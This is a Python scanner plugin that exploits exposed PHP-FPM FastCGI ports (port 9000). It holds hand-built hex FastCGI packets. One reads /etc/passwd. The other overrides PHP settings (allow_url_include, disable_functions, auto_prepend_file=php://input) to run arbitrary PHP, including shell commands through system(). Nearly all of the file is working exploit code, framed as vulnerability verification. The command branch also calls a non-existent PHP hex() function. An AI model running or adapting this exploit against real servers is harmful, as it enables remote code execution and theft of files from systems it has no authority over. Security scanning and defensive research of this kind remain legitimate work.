# coding:utf-8

import socket
import time

def bin2str(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

exp_payload_base = bin2str("""
01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00
01 04 00 01 01 14 04 00 0e 04 52 45 51 55 45 53
54 5f 4d 45 54 48 4f 44 50 4f 53 54 09 5b 50 48
50 5f 56 41 4c 55 45 61 6c 6c 6f 77 5f 75 72 6c
5f 69 6e 63 6c 75 64 65 20 3d 20 4f 6e 0a 64 69
73 61 62 6c 65 5f 66 75 6e 63 74 69 6f 6e 73 20
3d 20 0a 73 61 66 65 5f 6d 6f 64 65 20 3d 20 4f
66 66 0a 61 75 74 6f 5f 70 72 65 70 65 6e 64 5f
66 69 6c 65 20 3d 20 70 68 70 3a 2f 2f 69 6e 70
75 74 0f 17 53 43 52 49 50 54 5f 46 49 4c 45 4e
41 4d 45
""") + '{path}' \
+ bin2str("""
0d 01 44 4f 43 55
4d 45 4e 54 5f 52 4f 4f 54 2f 0f 10 53 45 52 56
45 52 5f 53 4f 46 54 57 41 52 45 67 6f 20 2f 20
66 63 67 69 63 6c 69 65 6e 74 20 0b 09 52 45 4d
4f 54 45 5f 41 44 44 52 31 32 37 2e 30 2e 30 2e
31 0f 08 53 45 52 56 45 52 5f 50 52 4f 54 4f 43
4f 4c 48 54 54 50 2f 31 2e 31 0e 02 43 4f 4e 54
45 4e 54 5f 4c 45 4e 47 54 48
""") + '{data_length}' \
+ bin2str("""
00 00 00 00
01 04 00 01 00 00 00 00 01 05 00 01 00 47 01 00
""") + '{php_code}' \
+ bin2str("""
00
""")

poc_payload = bin2str('''
01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00
01 04 00 01 00 8f 01 00 0e 03 52 45 51 55 45 53
54 5f 4d 45 54 48 4f 44 47 45 54 0f 08 53 45 52
56 45 52 5f 50 52 4f 54 4f 43 4f 4c 48 54 54 50
2f 31 2e 31 0d 01 44 4f 43 55 4d 45 4e 54 5f 52
4f 4f 54 2f 0b 09 52 45 4d 4f 54 45 5f 41 44 44
52 31 32 37 2e 30 2e 30 2e 31 0f 0b 53 43 52 49
50 54 5f 46 49 4c 45 4e 41 4d 45 2f 65 74 63 2f
70 61 73 73 77 64 0f 10 53 45 52 56 45 52 5f 53
4f 46 54 57 41 52 45 67 6f 20 2f 20 66 63 67 69
63 6c 69 65 6e 74 20 00 01 04 00 01 00 00 00 00
''')

phpfile_list = [
# '/usr/share/php/Archive/Tar.php',
# '/usr/share/php/Console/Getopt.php',
'/usr/share/php/OS/Guess.php',
'/usr/share/php/PEAR.php',
# '/usr/share/php/PEAR/Autoloader.php',
# '/usr/share/php/PEAR/Builder.php',
# '/usr/share/php/PEAR/Command.php',
# '/usr/share/php/PEAR/Common.php',
# '/usr/share/php/PEAR/Config.php',
# '/usr/share/php/PEAR/Installer.php',
# '/usr/share/php/PEAR/Packager.php',
# '/usr/share/php/PEAR/REST.php',
# '/usr/share/php/PEAR/Validate.php',
# '/usr/share/php/PEAR/XMLParser.php',
# '/usr/share/php/Structures/Graph.php',
# '/usr/share/php/Structures/Graph/Node.php',
# '/usr/share/php/System.php',
# '/usr/share/php/XML/Util.php',
# '/usr/share/php/pearcmd.php'
]

def get_plugin_info():
    plugin_info = {
        "name":"fastcgi任意文件读取及远程任意代码执行",
        "info":"可以通过fast-cgi获取文件或任意代码执行",
        "level":"高危",
        "type":"代码执行",
        "author":"nearg1e@YSRC",
        "source":1,
        "url":"http://www.cnblogs.com/LittleHann/p/4561462.html",
        "keyword":"port:9000"
    }
    return plugin_info

def send_socket(host, port, timeout, waittime=1, payload=''):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.setdefaulttimeout(timeout)
    sock.connect((host,port))
    sock.send(payload)
    time.sleep(waittime)
    res = sock.recv(1024)
    return res

def fast_cgi_rce(host, port, php_filepath='', commond=''):
    php_code = "<?php die(md5('ysrc@neargle'));?>"
    if commond:
        php_code = "<?php system('%s'); die(hex('ysrc@neargle'));?>" %commond

    exp_payload = exp_payload_base.format(
        path=php_filepath, data_length=str(len(php_code)),
        php_code=php_code
    )

    res = send_socket(host, port, timeout=5, waittime=1, payload=exp_payload)
    if '0b8c4ba32f584b513cb08b17d638a688' in res:
        return (True, res)
    return False

def exploit(host, port):
    for filepath in phpfile_list:
        res = fast_cgi_rce(host, port, php_filepath=filepath)
        if res:
            return (True, u'存在任意代码执行漏洞,php文件路径：' + filepath)
    return False

def verify(host, port):
    info = ''
    res = send_socket(host, port, timeout=5, waittime=0, payload=poc_payload)
    if ':root:' in res:
        info = u'存在fastcgi任意文件读取漏洞'
        return (True, info)
    return False

def check(host, port, timeout):
    info = ''
    try:
        ret = verify(host, port)
        if ret:
            info += ret[1]
        ret = exploit(host, port)
        if ret:
            info = info+u';' if info else info
            info += ret[1]
            return info
    except Exception as e:
        pass

if __name__ == '__main__':
    print(check('127.0.0.1', 9000, timeout=10))
